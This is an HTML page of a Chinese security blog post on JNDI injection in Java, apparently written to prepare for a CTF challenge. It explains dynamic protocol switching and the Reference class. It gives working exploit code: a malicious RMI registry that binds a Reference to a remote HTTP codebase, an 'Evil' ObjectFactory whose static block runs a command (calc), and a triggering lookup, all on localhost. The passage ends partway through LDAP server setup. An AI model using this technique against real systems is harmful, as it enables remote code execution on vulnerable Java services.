@@ -1,0 +1,1534 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="JDNI注入前言刚开始学java安全的时候真的是什么概念都不懂，然后rmi，ldap，jndi，jrmp就随随便便过去了，导致现在很多概念性的东西都不理解 突然想起来X1r0z大佬的N1 junior的题还没看，然后一看发现是jndi，就重新来学习一下 JNDI概念JNDI 本质上就是以一种统一的方式来管理对象, 开发者也可以通过它提供的接口来接入自己的服务 在bind之后，能够通过名称来访问对象">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI注入">
+<meta property="og:url" content="https://zer0peach.github.io/2024/04/18/JNDI%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="JDNI注入前言刚开始学java安全的时候真的是什么概念都不懂，然后rmi，ldap，jndi，jrmp就随随便便过去了，导致现在很多概念性的东西都不理解 突然想起来X1r0z大佬的N1 junior的题还没看，然后一看发现是jndi，就重新来学习一下 JNDI概念JNDI 本质上就是以一种统一的方式来管理对象, 开发者也可以通过它提供的接口来接入自己的服务 在bind之后，能够通过名称来访问对象">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240418173827807.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240418173836254.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240418191713119.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240418192319264.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240418194940573.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240418223447232.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240418195237564.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240418223621771.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240418222242882.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240418195237564.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240419194245840.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425214712148.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425214758541.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425214913135.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425223635957.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425223709621.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225128216.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225141604.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225225287.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225512597.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225638704.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425225736707.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425233615123.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425233630623.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425233650022.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425233841470.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425234310876.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240425234717659.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240426183357206.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240426175513823.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240426174344175.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240426174319155.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240426184341670.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240426191038095.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240426191821067.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240426191758373.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240426193525666.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240426193547665.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240426194606660.png">
+<meta property="article:published_time" content="2024-04-18T09:11:49.000Z">
+<meta property="article:modified_time" content="2024-04-26T11:58:11.812Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/JNDI%E6%B3%A8%E5%85%A5/image-20240418173827807.png">
+  
+  
+  
+  <title>JNDI注入 - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="JNDI注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-04-18 17:11" pubdate>
+          2024年4月18日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          28k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          231 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">JNDI注入</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="JDNI注入"><a href="#JDNI注入" class="headerlink" title="JDNI注入"></a>JDNI注入</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刚开始学java安全的时候真的是什么概念都不懂，然后rmi，ldap，jndi，jrmp就随随便便过去了，导致现在很多概念性的东西都不理解</p>
+<p>突然想起来X1r0z大佬的N1 junior的题还没看，然后一看发现是jndi，就重新来学习一下</p>
+<h2 id="JNDI概念"><a href="#JNDI概念" class="headerlink" title="JNDI概念"></a>JNDI概念</h2><p>JNDI 本质上就是以一种统一的方式来管理对象, 开发者也可以通过它提供的接口来接入自己的服务</p>
+<p>在bind之后，能够通过名称来访问对象</p>
+<p>简单的通过 JNDI 来访问 RMI 对象的 demo</p>
+<p>RMIServer</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;
+
+<span class="hljs-keyword">import</span> javax.naming.Context;
+<span class="hljs-keyword">import</span> javax.naming.InitialContext;
+<span class="hljs-keyword">import</span> javax.naming.NamingException;
+<span class="hljs-keyword">import</span> java.rmi.Remote;
+<span class="hljs-keyword">import</span> java.rmi.RemoteException;
+<span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;
+<span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;
+<span class="hljs-keyword">import</span> java.util.Properties;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException &#123;
+        <span class="hljs-type">Properties</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();
+        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);
+        env.put(Context.PROVIDER_URL,<span class="hljs-string">&quot;rmi://127.0.0.1:1099&quot;</span>);
+
+
+        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);
+        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<span class="hljs-comment">//可以通过该端口连接到注册表，并查找或注册远程对象</span>
+
+        <span class="hljs-type">HelloImpl</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloImpl</span>();
+        context.bind(<span class="hljs-string">&quot;hello&quot;</span>,hello);
+
+
+    &#125;
+&#125;
+<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span>&#123;
+    String <span class="hljs-title function_">world</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;
+&#125;
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Hello</span>&#123;
+    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">HelloImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException&#123;
+
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">world</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException&#123;
+        System.out.println(<span class="hljs-string">&quot;hello world&quot;</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hahahhha&quot;</span>;
+    &#125;
+&#125;</code></pre></div>
+
+<p>Properties就是手动设置上下文的一些属性</p>
+<p>HelloImpl要继承UnicastRemoteObject</p>
+<p>当一个类继承了<code>UnicastRemoteObject</code>类时，它就可以被远程客户端访问，并且可以通过RMI注册表注册和查找。</p>
+<p>并且也顺利解决了继承Serializable接口</p>
+<p>还有就是Java RMI要求所有远程方法都必须声明<code>throws RemoteException</code></p>
+<p>所以在Hello接口的world()方法要<code>throws RemoteException</code></p>
+<p>JNDIDemo</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;
+
+<span class="hljs-keyword">import</span> javax.naming.InitialContext;
+<span class="hljs-keyword">import</span> javax.naming.NamingException;
+<span class="hljs-keyword">import</span> java.rmi.Remote;
+<span class="hljs-keyword">import</span> java.rmi.RemoteException;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JDNIDemo</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException &#123;
+        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();
+        <span class="hljs-type">Hello</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Hello) context.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>);
+        System.out.println(hello.world());
+    &#125;
+&#125;</code></pre></div>
+
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418173827807.png" srcset="/img/loading.gif" lazyload alt="image-20240418173827807"></p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418173836254.png" srcset="/img/loading.gif" lazyload alt="image-20240418173836254"></p>
+<h2 id="JNDI注入原理"><a href="#JNDI注入原理" class="headerlink" title="JNDI注入原理"></a>JNDI注入原理</h2><p>造成 JNDI 注入的核心有两点</p>
+<ol>
+<li>动态协议转换</li>
+<li>Reference 类</li>
+</ol>
+<h3 id="先说动态协议转换"><a href="#先说动态协议转换" class="headerlink" title="先说动态协议转换"></a>先说动态协议转换</h3><p>听起来很高级，看了文章的断点调试后其实很简单</p>
+<p>简单来说就是lookup方法会截取 <code>://</code> 之前的内容作为协议名，然后调用工厂类的 getObjectInstance 方法来得到对应协议的 context</p>
+<p>如果获取不到的话, 就会使用原来 env 中指定的 <code>INITIAL_CONTEXT_FACTORY</code></p>
+<p>JNDI 默认支持动态转换的协议如下</p>
+<table>
+<thead>
+<tr>
+<th>协议名称</th>
+<th align="center">协议URL</th>
+<th>Context类</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DNS协议</td>
+<td align="center">dns:&#x2F;&#x2F;</td>
+<td>com.sun.jndi.url.dns.dnsURLContext</td>
+</tr>
+<tr>
+<td>RMI协议</td>
+<td align="center">rmi:&#x2F;&#x2F;</td>
+<td>com.sun.jndi.url.rmi.rmiURLContext</td>
+</tr>
+<tr>
+<td>LDAP协议</td>
+<td align="center">ldap:&#x2F;&#x2F;</td>
+<td>com.sun.jndi.url.ldap.ldapURLContext</td>
+</tr>
+<tr>
+<td>LDAP协议</td>
+<td align="center">ldaps:&#x2F;&#x2F;</td>
+<td>com.sun.jndi.url.ldaps.ldapsURLContextFactory</td>
+</tr>
+<tr>
+<td>IIOP对象请求代理协议</td>
+<td align="center">iiop:&#x2F;&#x2F;</td>
+<td>com.sun.jndi.url.iiop.iiopURLContext</td>
+</tr>
+<tr>
+<td>IIOP对象请求代理协议</td>
+<td align="center">iiopname:&#x2F;&#x2F;</td>
+<td>com.sun.jndi.url.iiopname.iiopnameURLContextFactory</td>
+</tr>
+<tr>
+<td>IIOP对象请求代理协议</td>
+<td align="center">corbaname:&#x2F;&#x2F;</td>
+<td>com.sun.jndi.url.corbaname.corbanameURLContextFactory</td>
+</tr>
+</tbody></table>
+<p>获取到这些Context后再进行后续的lookup方法</p>
+<h3 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h3><p>常用的重载方法</p>
+<div class="code-wrapper"><pre><code class="hljs java">Reference(String className, String factory, String factoryLocation)</code></pre></div>
+
+<p>各个参数含义如下</p>
+<ul>
+<li>className: 工厂类加载的类名</li>
+<li>factory: 远程加载的工厂类类名</li>
+<li>factoryLocation: 远程加载工厂类的地址 (file http ftp 等协议)</li>
+</ul>
+<p>客户端通过 lookup 得到 Reference 对象后, 会继续访问 factoryLocation 从而去加载某个 factory class, 然后调用该 factory 实例的 getObjectInstance 方法, 最终得到某个 class (由 className 指定)</p>
+<p>Reference 可以被绑定在 RMI 或 LDAP 服务器上, 下文将分别讲解如何利用这两种方式来进行 JNDI 注入并远程加载恶意 class</p>
+<h4 id="RMI-Reference"><a href="#RMI-Reference" class="headerlink" title="RMI + Reference"></a>RMI + Reference</h4><p>对于 RMI 协议, 我们可以将 Reference (或者套上一层 ReferenceWrapper) 绑定到 RMI Registry, 然后控制 lookup 参数指向恶意 RMI 服务器来加载恶意 class</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;
+
+<span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+<span class="hljs-keyword">import</span> javax.naming.Context;
+<span class="hljs-keyword">import</span> javax.naming.InitialContext;
+<span class="hljs-keyword">import</span> javax.naming.NamingException;
+<span class="hljs-keyword">import</span> javax.naming.Reference;
+<span class="hljs-keyword">import</span> java.rmi.Remote;
+<span class="hljs-keyword">import</span> java.rmi.RemoteException;
+<span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;
+<span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;
+<span class="hljs-keyword">import</span> java.util.Properties;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException &#123;
+        <span class="hljs-type">Properties</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();
+        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);
+        env.put(Context.PROVIDER_URL,<span class="hljs-string">&quot;rmi://127.0.0.1:1099&quot;</span>);
+
+
+        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);
+        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);
+
+<span class="hljs-comment">//        HelloImpl hello = new HelloImpl();</span>
+<span class="hljs-comment">//        context.bind(&quot;hello&quot;,hello);</span>
+        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;com.example.Evil&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8000/&quot;</span>);
+        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);
+        context.bind(<span class="hljs-string">&quot;test&quot;</span>,reference);
+
+
+    &#125;
+&#125;</code></pre></div>
+
+<p>Evil不继承ObjectFactory的话控制台会报错，但可以执行</p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418191713119.png" srcset="/img/loading.gif" lazyload alt="image-20240418191713119"></p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;
+
+<span class="hljs-keyword">import</span> javax.naming.Context;
+<span class="hljs-keyword">import</span> javax.naming.Name;
+<span class="hljs-keyword">import</span> javax.naming.spi.ObjectFactory;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.util.Hashtable;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;
+    <span class="hljs-keyword">static</span> &#123;
+        <span class="hljs-keyword">try</span> &#123;
+            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);
+        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
+        &#125;
+    &#125;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
+    &#125;
+&#125;</code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;
+
+<span class="hljs-keyword">import</span> javax.naming.InitialContext;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIDemo</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;
+        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();
+        ctx.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/test&quot;</span>);
+    &#125;
+&#125;</code></pre></div>
+
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418192319264.png" srcset="/img/loading.gif" lazyload alt="image-20240418192319264"></p>
+<h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418194940573.png" srcset="/img/loading.gif" lazyload alt="image-20240418194940573"></p>
+<p>不断跟进</p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418223447232.png" srcset="/img/loading.gif" lazyload alt="image-20240418223447232"></p>
+<p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418195237564.png" srcset="/img/loading.gif" lazyload alt="image-20240418195237564"></p>
+<p>本地加载 factory 类失败的话就会获取 codebase (也就是 factoryLocation), 再传入 helper 中使用 URLClassLoader 尝试加载</p>
+<p>如果加载成功, 就会实例化 factory 类并强制转换为 ObjectFactory 类型, 这里也就是为什么我们最好要让 Evil 类继承 ObjectFactory</p>
+<h4 id="LDAP-Reference"><a href="#LDAP-Reference" class="headerlink" title="LDAP + Reference"></a>LDAP + Reference</h4><p>LDAP 的 JNDI 注入与 RMI 基本一致</p>
+<p>手工搭建LDAP服务器需要添加如下依赖包</p>
+<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.0.7<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;
+<span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;
